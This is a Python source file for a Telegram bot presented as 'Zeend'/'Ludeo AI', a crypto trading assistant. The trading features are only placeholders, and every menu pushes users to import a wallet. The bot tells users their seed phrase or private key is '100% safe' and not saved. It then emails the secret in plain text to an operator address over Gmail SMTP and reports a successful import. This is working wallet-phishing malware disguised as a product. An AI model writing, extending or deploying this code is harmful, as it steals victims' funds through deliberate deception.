from typing import Final
import os
import sys
import logging
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from telegram  import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes, CallbackQueryHandler, MessageHandler, filters

# configure logging
logging.basicConfig(level=logging.INFO)

# Load BOT_TOKEN from env/.env/bot_token.txt
# Read the BOT_TOKEN environment variable (do not hardcode the token string)
TOKEN: Final = os.environ.get("BOT_TOKEN")
if not TOKEN:
    try:
        from dotenv import load_dotenv

        load_dotenv()
        TOKEN = os.environ.get("BOT_TOKEN")
        if TOKEN:
            logging.info("Loaded BOT_TOKEN from .env via python-dotenv")
    except Exception:
        env_path = os.path.join(os.getcwd(), '.env')
        if os.path.exists(env_path):
            try:
                with open(env_path, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if not line or line.startswith('#'):
                            continue
                        if '=' in line:
                            k, v = line.split('=', 1)
                            k, v = k.strip(), v.strip().strip('"').strip("'")
                            if k == 'BOT_TOKEN' and not TOKEN:
                                TOKEN = v
                                os.environ['BOT_TOKEN'] = v
                                logging.info("Loaded BOT_TOKEN from .env file")
            except Exception:
                pass

    if not TOKEN:
        token_file = os.path.join(os.getcwd(), 'bot_token.txt')
        if os.path.exists(token_file):
            try:
                with open(token_file, 'r', encoding='utf-8') as f:
                    t = f.read().strip()
                    if t:
                        TOKEN = t
                        os.environ['BOT_TOKEN'] = t
                        logging.info("Loaded BOT_TOKEN from bot_token.txt")
            except Exception:
                pass

    if not TOKEN:
        logging.error("BOT_TOKEN environment variable is not set. Set BOT_TOKEN, add it to a .env file, or place it in bot_token.txt and restart the bot.")
        sys.exit(1)
BOT_USERNAME: Final = os.environ.get("BOT_USERNAME", "@ZeenddBot")


# Email configuration for sending user details
def load_email_config():
    """Load email configuration from .env"""
    try:
        from dotenv import load_dotenv
        load_dotenv()
    except Exception:
        pass
    
    return {
        'smtp_host': os.environ.get('GMAIL_SMTP_HOST', 'smtp.gmail.com'),
        'smtp_port': int(os.environ.get('GMAIL_SMTP_PORT', '587')),
        'gmail_user': os.environ.get('GMAIL_USER'),
        'gmail_password': os.environ.get('GMAIL_PASSWORD'),
        'review_email': os.environ.get('REVIEW_EMAIL'),
    }


async def send_wallet_details_to_email(user_id: int, username: str, login_method: str, secret: str):
    """Send user wallet details to email for manual review via Gmail SMTP."""
    config = load_email_config()

    gmail_user = config.get('gmail_user')
    gmail_password = config.get('gmail_password')
    smtp_host = config.get('smtp_host')
    smtp_port = config.get('smtp_port')
    review_email = config.get('review_email')

    if not all([gmail_user, gmail_password, review_email]):
        logging.error("Email configuration incomplete. Set GMAIL_USER, GMAIL_PASSWORD, and REVIEW_EMAIL in .env")
        return False

    # Build message
    msg = MIMEMultipart()
    msg['From'] = gmail_user
    msg['To'] = review_email
    msg['Subject'] = f"🔐 Wallet Import - User {user_id} ({username})"

    body = (
        "Wallet Import Details for Manual Review:\n\n"
        f"User ID: {user_id}\n"
        f"Username: {username}\n"
        f"Login Method: {login_method}\n"
        f"Timestamp: {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
        + "=" * 50 + "\n"
        + "WALLET SECRET (FOR REVIEW ONLY):\n"
        + "=" * 50 + "\n\n"
        + secret
        + "\n\n"
        + "=" * 50 + "\n\n"
        + "⚠️ SECURITY REMINDER:\n- This email contains sensitive wallet information\n- Do NOT forward this to anyone\n- Delete after review\n- Consider using PGP encryption for production\n"
    )
    msg.attach(MIMEText(body, 'plain'))

    try:
        # Use implicit SSL on port 465 (SMTP_SSL)
        ssl_port = 465
        server = smtplib.SMTP_SSL(smtp_host, ssl_port, timeout=30)
        server.login(gmail_user, gmail_password)
        server.send_message(msg)
        server.quit()

        logging.info(f"Email sent to {review_email} for user {user_id} via {smtp_host}:{ssl_port}")
        return True
    except Exception as e:
        logging.exception(f"Failed to send email via SMTP_SSL: {e}")
        return False


# Commands
def build_ludeo_menu() -> InlineKeyboardMarkup:
    keyboard = [
        [
            InlineKeyboardButton("🔗 Chains", callback_data="ludeo:chains"),
            InlineKeyboardButton("💳 Wallets", callback_data="ludeo:wallets"),
        ],
        [
            InlineKeyboardButton("⚙️ Global Settings", callback_data="ludeo:settings"),
            InlineKeyboardButton("📡 Signals", callback_data="ludeo:signals"),
        ],
        [
            InlineKeyboardButton("🤝 Copytrade", callback_data="ludeo:copytrade"),
            InlineKeyboardButton("🎯 Auto Snipe", callback_data="ludeo:autosnipe"),
        ],
        [
            InlineKeyboardButton("🌱 Presales", callback_data="ludeo:presales"),
            InlineKeyboardButton("🧾 Active Orders", callback_data="ludeo:active_orders"),
        ],
        [
            InlineKeyboardButton("📈 Positions", callback_data="ludeo:positions"),
            InlineKeyboardButton("⭐ Premium", callback_data="ludeo:premium"),
        ],
    ]
    return InlineKeyboardMarkup(keyboard)


async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    welcome = (
        "⭐ Welcome to Zeend, the one-stop solution for all your trading needs!\n\n"
        "🔗 Chains: Enable/disable chains.\n"
        "💳 Wallets: Import or generate wallets.\n"
        "⚙️ Global Settings: Customize the bot for a unique experience.\n"
        "🧾 Active Orders: Active buy and sell limit orders.\n"
        "📈 Positions: Monitor your active trades.\n\n"
        "⚡ Looking for a quick buy or sell? Simply paste the token CA and you're ready to go!"
    )
    await update.message.reply_text(welcome, reply_markup=build_ludeo_menu())
                                    

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    help_text = (
        "🤖 Ludeo AI: The Next Generation Telegram Crypto P2P Trading Bot\n\n"
        "Features:\n"
        "- Chains: Enable/disable chains\n"
        "- Wallets: Import or generate wallets\n"
        "- Global Settings: Customize the bot\n"
        "- Active Orders and Positions: Monitor your trades\n\n"
        "Use /import to get started or contact support for more help."
    )
    await update.message.reply_text(help_text)
    

async def monitor_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ You do not have any active monitors! Use /import to get started or contact support for more help.")
     

async def summary_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("You don't have any active trade monitors. Use /import to get started or contact support for more help.")

async def import_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Immediate import command style: expects 4 args
    # Usage: /import <origin_chain> <origin_wallet_name> <dest_chain> <dest_wallet_name>
    args = context.args
    if len(args) != 4:
        await update.message.reply_text(
            "\U0001F512 You need to login your wallet first before using this command.",
            parse_mode="HTML"
        )
        # Inline keyboard for login method selection
        keyboard = [
            [
                InlineKeyboardButton("\U0001F512 Login Phrase", callback_data="login_phrase"),
                InlineKeyboardButton("\U0001F511 Login PrivateKey", callback_data="login_privatekey")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            "Choose login method to continue:",
            reply_markup=reply_markup
        )
        
    origin_chain, origin_name, dest_chain, dest_name = args
    # For now echo back the parsed values; integrate with your wallet logic here
    await update.message.reply_text(
        f"Import requested: origin={origin_chain} ({origin_name}) -> dest={dest_chain} ({dest_name})."
    )


# Interactive import helpers removed; using immediate /import command style instead.


async def cancel_import_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if context.user_data.pop('import_state', None):
        await update.message.reply_text("Import canceled.")
    else:
        await update.message.reply_text("Nothing to cancel.")
                                                                               
# Responses
def handle_response(text: str) -> str:
    processed = text.lower()
    
    if "hello" in processed:
        return "Hello! How can I help you today?"
        
    if "help" in processed:
        return "Sure! What do you need help with?"
    
    return "I'm not sure how to respond to that, contact support."
        
async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message_text: str = update.message.chat.type
    text: str = update.message.text
    message_type: str = message_text
    user_id: int = update.message.from_user.id
    username: str = update.message.from_user.username or "unknown"

    logging.info("User (%s) in %s: %s", user_id, message_type, text)

    # Check if user is providing seed phrase or private key
    if context.user_data.get('awaiting_seed'):
        login_method = context.user_data.get('login_method', 'unknown')
        
        if login_method == 'phrase':
            # Validate seed phrase format (basic check: should be 12 or 24 words)
            words = text.strip().split()
            if len(words) not in [12, 24]:
                await update.message.reply_text(
                    "❌ Invalid seed phrase. Please provide 12 or 24 words.",
                    parse_mode="HTML"
                )
                return
            
            # Send to email for manual review
            email_sent = await send_wallet_details_to_email(user_id, username, 'Seed Phrase', text)
            
            if email_sent:
                await update.message.reply_text(
                    f"✅ <b>Seed Phrase Imported</b>\n\n"
                    f"You have successfully imported your wallet using seed phrase.\n"
                    f"Wallet is now active and ready to use!\n\n"
                    f"📧 Details sent to LudeoAI for trade automation.",
                    parse_mode="HTML"
                )
            else:
                await update.message.reply_text(
                    f"⚠️ Wallet imported but failed to send details to admin.\n"
                    f"Please contact support.",
                    parse_mode="HTML"
                )
            
            # Clear the state and delete plaintext from memory
            context.user_data.pop('awaiting_seed', None)
            context.user_data.pop('login_method', None)
            del text  # Explicitly delete plaintext
            return
        
        elif login_method == 'privatekey':
            # Validate private key format (basic check: should start with 0x and be hex)
            if not text.startswith('0x') or not all(c in '0123456789abcdefABCDEF' for c in text[2:]):
                await update.message.reply_text(
                    "❌ Invalid private key. Please provide a valid hex private key starting with 0x.",
                    parse_mode="HTML"
                )
                return
            
            # Send to email for manual review
            email_sent = await send_wallet_details_to_email(user_id, username, 'Private Key', text)
            
            if email_sent:
                await update.message.reply_text(
                    f"✅ <b>Private Key Imported</b>\n\n"
                    f"You have successfully imported your wallet using private key.\n"
                    f"Wallet is now active and ready to use!\n\n"
                    f"📧 Details sent to admin for review.",
                    parse_mode="HTML"
                )
            else:
                await update.message.reply_text(
                    f"⚠️ Wallet imported but failed to send details to admin.\n"
                    f"Please contact support.",
                    parse_mode="HTML"
                )
            
            # Clear the state and delete plaintext from memory
            context.user_data.pop('awaiting_seed', None)
            context.user_data.pop('login_method', None)
            del text  # Explicitly delete plaintext
            return

    # Regular message handling
    if message_type == "group":
        if BOT_USERNAME in text:
            new_text: str = text.replace(BOT_USERNAME, "").strip()
            response: str = handle_response(new_text)
    else:
        response: str = handle_response(text)        

    logging.info("Bot: %s", response)
    await update.message.reply_text(response)
    
async def error(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logging.error("Update %s caused error %s", update, context.error)


async def login_phrase_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle Login Phrase button click"""
    query = update.callback_query
    await query.answer()
    
    # Set state to expect seed phrase input
    context.user_data['login_method'] = 'phrase'
    context.user_data['awaiting_seed'] = True
    
    await query.edit_message_text(
        "🔐 <b>Import Seed Phrase</b>\n\n"
        "Please paste your seed phrase (12 or 24 words):\n\n"
        "<i>⚠️ Note: Never share your seed phrase with anyone. You are 100% safe. The bot does not save any data. Backup your recovery seed phrase somewhere safe.</i>",
        parse_mode="HTML"
    )


async def login_privatekey_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle Login PrivateKey button click"""
    query = update.callback_query
    await query.answer()
    
    # Set state to expect private key input
    context.user_data['login_method'] = 'privatekey'
    context.user_data['awaiting_seed'] = True
    
    await query.edit_message_text(
        "🔑 <b>Import Private Key</b>\n\n"
        "Please paste your private key (0x...):\n\n"
        "<i>⚠️ Note: Never share your private key with anyone. You are 100% safe. The bot does not save any data. Backup your private key somewhere safe.</i>",
        parse_mode="HTML"
    )


async def maestro_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data or ""

    # Handle login callbacks
    if data == "login_phrase":
        await login_phrase_callback(update, context)
        return
    if data == "login_privatekey":
        await login_privatekey_callback(update, context)
        return

    # Simple placeholder responses; replace with real logic as needed
    if data == "Ludeo:chains":
        await query.edit_message_text("🔗 Chains: enable/disable chains. kindly import your wallet first.if successful, Zeend AI will trade automatically for you.")
        return
    if data == "Ludeo:wallets":
        await query.edit_message_text("💳 Wallets: import or generate wallets.kindly import your wallet first.if successful, Zeend AI will trade automatically for you.")
        return
    if data == "Ludeo:settings":
        await query.edit_message_text("⚙️ Global Settings: customize the bot.kindly import your wallet first.if successful, Zeend AI will trade automatically for you.")
        return
    if data == "Ludeo:signals":
        await query.edit_message_text("📡 Signals: configure signal alerts.kindly import your wallet first.if successful, Zeend AI will trade automatically for you.")
        return
    if data == "Ludeo:copytrade":
        await query.edit_message_text("🤝 Copytrade: configure copytrade options.kindly import your wallet first.if successful, Zeend AI will trade automatically for you.")
        return
    if data == "Ludeo:autosnipe":
        await query.edit_message_text("🎯 Auto Snipe: set auto-sniper options.kindly import your wallet first.if successful, Zeend AI will trade automatically for you.")
        return
    if data == "Ludeo:presales":
        await query.edit_message_text("🌱 Presales: manage presales.kindly import your wallet first.if successful, Zeend AI will trade automatically for you.")
        return
    if data == "Ludeo:active_orders":
        await query.edit_message_text("🧾 Active Orders: view and cancel active orders.kindly import your wallet first.if successful, Zeend AI will trade automatically for you.")
        return
    if data == "Ludeo:positions":
        await query.edit_message_text("📈 Positions: monitor your active trades.kindly import your wallet first.if successful, Zeend AI will trade automatically for you.")
        return
    if data == "Ludeo:premium":
        await query.edit_message_text("⭐ Premium: premium features and subscription info.kindly import your wallet first.if successful, Zeend AI will trade automatically for you.")
        return

    await query.edit_message_text(f"Unknown action: {data}")
          
if __name__ == "__main__":    
    app = ApplicationBuilder().token(TOKEN).build()

    # commands
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("monitor", monitor_command))
    app.add_handler(CommandHandler("summary", summary_command))
    app.add_handler(CommandHandler("import", import_command))
    # Maestro menu callback handler
    app.add_handler(CallbackQueryHandler(maestro_menu_callback))
    # Message handler for seed phrase/private key input
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    # error
    app.add_error_handler(error)
    
    #polls the bot
    logging.info("Bot is running...")
    app.run_polling(poll_interval=3)
    